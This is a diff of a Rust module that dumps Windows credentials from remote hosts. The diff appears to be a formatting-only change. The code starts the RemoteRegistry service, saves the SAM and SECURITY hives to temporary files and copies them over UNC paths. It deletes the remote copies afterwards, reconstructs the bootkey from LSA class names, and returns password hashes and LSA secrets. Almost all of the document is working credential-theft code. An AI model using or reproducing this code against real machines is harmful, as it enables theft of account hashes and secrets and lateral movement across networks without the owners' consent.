@@ -7,11 +7,11 @@
 use super::hive::Hive;
 use super::sam::{self, SamHash};
 use std::time::{SystemTime, UNIX_EPOCH};
-use windows::core::PCWSTR;
 use windows::Win32::Foundation::ERROR_SUCCESS;
 use windows::Win32::Storage::FileSystem::{CopyFileW, DeleteFileW};
 use windows::Win32::System::Registry::*;
 use windows::Win32::System::Services::*;
+use windows::core::PCWSTR;
 
 fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
@@ -43,23 +43,25 @@ fn gen_tmp_name() -> String {
 /// Returns `true` if we started it (so we should stop it later).
 fn ensure_remote_registry(target: &str) -> Result<bool, String> {
     let target_w = wide(&format!("\\\\{target}"));
-    let scm = unsafe {
-        OpenSCManagerW(
-            PCWSTR(target_w.as_ptr()),
-            None,
-            SC_MANAGER_CONNECT,
-        )
-    }.map_err(|e| format!("OpenSCManager failed: {e}"))?;
+    let scm = unsafe { OpenSCManagerW(PCWSTR(target_w.as_ptr()), None, SC_MANAGER_CONNECT) }
+        .map_err(|e| format!("OpenSCManager failed: {e}"))?;
 
     let svc_name = wide("RemoteRegistry");
     let svc = unsafe {
         OpenServiceW(
             scm,
             PCWSTR(svc_name.as_ptr()),
-            SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG,
+            SERVICE_START
+                | SERVICE_STOP
+                | SERVICE_QUERY_STATUS
+                | SERVICE_CHANGE_CONFIG
+                | SERVICE_QUERY_CONFIG,
         )
-    }.map_err(|e| {
-        unsafe { let _ = CloseServiceHandle(scm); }
+    }
+    .map_err(|e| {
+        unsafe {
+            let _ = CloseServiceHandle(scm);
+        }
         format!("OpenService RemoteRegistry: {e}")
     })?;
 
@@ -78,13 +80,19 @@ fn ensure_remote_registry(target: &str) -> Result<bool, String> {
         )
     };
     if ok.is_err() {
-        unsafe { let _ = CloseServiceHandle(svc); let _ = CloseServiceHandle(scm); }
+        unsafe {
+            let _ = CloseServiceHandle(svc);
+            let _ = CloseServiceHandle(scm);
+        }
         return Err("QueryServiceStatusEx failed".into());
     }
 
     let already_running = status.dwCurrentState == SERVICE_RUNNING;
     if already_running {
-        unsafe { let _ = CloseServiceHandle(svc); let _ = CloseServiceHandle(scm); }
+        unsafe {
+            let _ = CloseServiceHandle(svc);
+            let _ = CloseServiceHandle(scm);
+        }
         return Ok(false); // didn't need to start it
     }
 
@@ -146,8 +154,14 @@ fn ensure_remote_registry(target: &str) -> Result<bool, String> {
                 )
             };
         }
-        unsafe { let _ = CloseServiceHandle(svc); let _ = CloseServiceHandle(scm); }
-        return Err(format!("Failed to start RemoteRegistry service: {}", start_result.unwrap_err()));
+        unsafe {
+            let _ = CloseServiceHandle(svc);
+            let _ = CloseServiceHandle(scm);
+        }
+        return Err(format!(
+            "Failed to start RemoteRegistry service: {}",
+            start_result.unwrap_err()
+        ));
     }
 
     // Wait for it to be running (up to 10 seconds)
@@ -169,7 +183,10 @@ fn ensure_remote_registry(target: &str) -> Result<bool, String> {
         }
     }
 
-    unsafe { let _ = CloseServiceHandle(svc); let _ = CloseServiceHandle(scm); }
+    unsafe {
+        let _ = CloseServiceHandle(svc);
+        let _ = CloseServiceHandle(scm);
+    }
 
     if status.dwCurrentState != SERVICE_RUNNING {
         return Err("RemoteRegistry service did not start in time".into());
@@ -181,19 +198,26 @@ fn ensure_remote_registry(target: &str) -> Result<bool, String> {
 /// Stop the RemoteRegistry service and restore Disabled state if needed.
 fn stop_remote_registry(target: &str) {
     let target_w = wide(&format!("\\\\{target}"));
-    let scm = match unsafe {
-        OpenSCManagerW(PCWSTR(target_w.as_ptr()), None, SC_MANAGER_CONNECT)
-    } {
+    let scm = match unsafe { OpenSCManagerW(PCWSTR(target_w.as_ptr()), None, SC_MANAGER_CONNECT) } {
         Ok(h) => h,
         Err(_) => return,
     };
 
     let svc_name = wide("RemoteRegistry");
     let svc = match unsafe {
-        OpenServiceW(scm, PCWSTR(svc_name.as_ptr()), SERVICE_STOP | SERVICE_CHANGE_CONFIG)
+        OpenServiceW(
+            scm,
+            PCWSTR(svc_name.as_ptr()),
+            SERVICE_STOP | SERVICE_CHANGE_CONFIG,
+        )
     } {
         Ok(h) => h,
-        Err(_) => { unsafe { let _ = CloseServiceHandle(scm); } return; }
+        Err(_) => {
+            unsafe {
+                let _ = CloseServiceHandle(scm);
+            }
+            return;
+        }
     };
 
     // Stop the service
@@ -216,7 +240,10 @@ fn stop_remote_registry(target: &str) {
             PCWSTR::null(),
         )
     };
-    unsafe { let _ = CloseServiceHandle(svc); let _ = CloseServiceHandle(scm); }
+    unsafe {
+        let _ = CloseServiceHandle(svc);
+        let _ = CloseServiceHandle(scm);
+    }
 }
 
 /// Dump SAM hashes from a remote host.
@@ -229,11 +256,12 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
     // 1. Connect to remote registry
     let mut hklm = HKEY::default();
     let target_w = wide(&format!("\\\\{target}"));
-    let ret = unsafe {
-        RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm)
-    };
+    let ret =
+        unsafe { RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm) };
     if ret != ERROR_SUCCESS {
-        if we_started_svc { stop_remote_registry(target); }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("RegConnectRegistry failed: {}", ret.0));
     }
 
@@ -241,8 +269,12 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
     let bootkey = match extract_bootkey_remote(hklm) {
         Ok(bk) => bk,
         Err(e) => {
-            unsafe { let _ = RegCloseKey(hklm); }
-            if we_started_svc { stop_remote_registry(target); }
+            unsafe {
+                let _ = RegCloseKey(hklm);
+            }
+            if we_started_svc {
+                stop_remote_registry(target);
+            }
             return Err(format!("Bootkey extraction failed: {e}"));
         }
     };
@@ -264,19 +296,27 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
         )
     };
     if ret != ERROR_SUCCESS {
-        unsafe { let _ = RegCloseKey(hklm); }
-        if we_started_svc { stop_remote_registry(target); }
+        unsafe {
+            let _ = RegCloseKey(hklm);
+        }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("Cannot open SAM key: {}", ret.0));
     }
 
     let remote_path_w = wide(&remote_path);
-    let ret = unsafe {
-        RegSaveKeyW(sam_key, PCWSTR(remote_path_w.as_ptr()), None)
+    let ret = unsafe { RegSaveKeyW(sam_key, PCWSTR(remote_path_w.as_ptr()), None) };
+    unsafe {
+        let _ = RegCloseKey(sam_key);
     };
-    unsafe { let _ = RegCloseKey(sam_key); };
     if ret != ERROR_SUCCESS {
-        unsafe { let _ = RegCloseKey(hklm); }
-        if we_started_svc { stop_remote_registry(target); }
+        unsafe {
+            let _ = RegCloseKey(hklm);
+        }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("RegSaveKey SAM failed: {}", ret.0));
     }
 
@@ -287,12 +327,18 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
     let local_w = wide(&local_path_str);
     let ok = unsafe { CopyFileW(PCWSTR(unc_w.as_ptr()), PCWSTR(local_w.as_ptr()), true) };
     // Clean up remote temp file immediately
-    unsafe { let _ = DeleteFileW(PCWSTR(unc_w.as_ptr())); }
-    unsafe { let _ = RegCloseKey(hklm); };
+    unsafe {
+        let _ = DeleteFileW(PCWSTR(unc_w.as_ptr()));
+    }
+    unsafe {
+        let _ = RegCloseKey(hklm);
+    };
 
     if ok.is_err() {
         let _ = std::fs::remove_file(&local_tmp);
-        if we_started_svc { stop_remote_registry(target); }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("Failed to download SAM hive from {unc_path}"));
     }
 
@@ -301,7 +347,9 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
         Ok(d) => d,
         Err(e) => {
             let _ = std::fs::remove_file(&local_tmp);
-            if we_started_svc { stop_remote_registry(target); }
+            if we_started_svc {
+                stop_remote_registry(target);
+            }
             return Err(format!("Failed to read local SAM: {e}"));
         }
     };
@@ -316,7 +364,9 @@ pub fn remote_dump_sam(target: &str) -> Result<SamDumpResult, String> {
         }
     };
 
-    if we_started_svc { stop_remote_registry(target); }
+    if we_started_svc {
+        stop_remote_registry(target);
+    }
     Ok(SamDumpResult { hashes, errors })
 }
 
@@ -330,11 +380,12 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
     // 1. Connect
     let mut hklm = HKEY::default();
     let target_w = wide(&format!("\\\\{target}"));
-    let ret = unsafe {
-        RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm)
-    };
+    let ret =
+        unsafe { RegConnectRegistryW(PCWSTR(target_w.as_ptr()), HKEY_LOCAL_MACHINE, &mut hklm) };
     if ret != ERROR_SUCCESS {
-        if we_started_svc { stop_remote_registry(target); }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("RegConnectRegistry failed: {}", ret.0));
     }
 
@@ -343,7 +394,9 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
         Ok(bk) => bk,
         Err(e) => {
             errors.push(format!("Bootkey: {e}"));
-            unsafe { let _ = RegCloseKey(hklm); }
+            unsafe {
+                let _ = RegCloseKey(hklm);
+            }
             // Return empty — we can still try to list secret names
             [0u8; 16]
         }
@@ -366,19 +419,27 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
         )
     };
     if ret != ERROR_SUCCESS {
-        unsafe { let _ = RegCloseKey(hklm); }
-        if we_started_svc { stop_remote_registry(target); }
+        unsafe {
+            let _ = RegCloseKey(hklm);
+        }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("Cannot open SECURITY key: {}", ret.0));
     }
 
     let remote_path_w = wide(&remote_path);
-    let ret = unsafe {
-        RegSaveKeyW(sec_key, PCWSTR(remote_path_w.as_ptr()), None)
-    };
-    unsafe { let _ = RegCloseKey(sec_key); }
+    let ret = unsafe { RegSaveKeyW(sec_key, PCWSTR(remote_path_w.as_ptr()), None) };
+    unsafe {
+        let _ = RegCloseKey(sec_key);
+    }
     if ret != ERROR_SUCCESS {
-        unsafe { let _ = RegCloseKey(hklm); }
-        if we_started_svc { stop_remote_registry(target); }
+        unsafe {
+            let _ = RegCloseKey(hklm);
+        }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("RegSaveKey SECURITY failed: {}", ret.0));
     }
 
@@ -388,12 +449,18 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
     let unc_w = wide(&unc_path);
     let local_w = wide(&local_path_str);
     let ok = unsafe { CopyFileW(PCWSTR(unc_w.as_ptr()), PCWSTR(local_w.as_ptr()), true) };
-    unsafe { let _ = DeleteFileW(PCWSTR(unc_w.as_ptr())); }
-    unsafe { let _ = RegCloseKey(hklm); }
+    unsafe {
+        let _ = DeleteFileW(PCWSTR(unc_w.as_ptr()));
+    }
+    unsafe {
+        let _ = RegCloseKey(hklm);
+    }
 
     if ok.is_err() {
         let _ = std::fs::remove_file(&local_tmp);
-        if we_started_svc { stop_remote_registry(target); }
+        if we_started_svc {
+            stop_remote_registry(target);
+        }
         return Err(format!("Failed to download SECURITY hive from {unc_path}"));
     }
 
@@ -402,7 +469,9 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
         Ok(d) => d,
         Err(e) => {
             let _ = std::fs::remove_file(&local_tmp);
-            if we_started_svc { stop_remote_registry(target); }
+            if we_started_svc {
+                stop_remote_registry(target);
+            }
             return Err(format!("Failed to read SECURITY hive: {e}"));
         }
     };
@@ -437,7 +506,9 @@ pub fn remote_dump_lsa(target: &str) -> Result<LsaDumpResult, String> {
         secrets.insert(0, format!("bootkey: {bk_hex}"));
     }
 
-    if we_started_svc { stop_remote_registry(target); }
+    if we_started_svc {
+        stop_remote_registry(target);
+    }
     Ok(LsaDumpResult { secrets, errors })
 }
 
@@ -482,15 +553,10 @@ fn extract_bootkey_remote(hklm: HKEY) -> Result<[u8; 16], String> {
     // Read class names from Lsa subkeys
     let mut scrambled = Vec::with_capacity(16);
     for name in ["JD", "Skew1", "GBG", "Data"] {
-        let path = format!(
-            "SYSTEM\\ControlSet{:03}\\Control\\Lsa\\{name}",
-            cs_num
-        );
+        let path = format!("SYSTEM\\ControlSet{:03}\\Control\\Lsa\\{name}", cs_num);
         let path_w = wide(&path);
         let mut key = HKEY::default();
-        let ret = unsafe {
-            RegOpenKeyExW(hklm, PCWSTR(path_w.as_ptr()), None, KEY_READ, &mut key)
-        };
+        let ret = unsafe { RegOpenKeyExW(hklm, PCWSTR(path_w.as_ptr()), None, KEY_READ, &mut key) };
         if ret != ERROR_SUCCESS {
             return Err(format!("Cannot open {path}: {}", ret.0));
         }
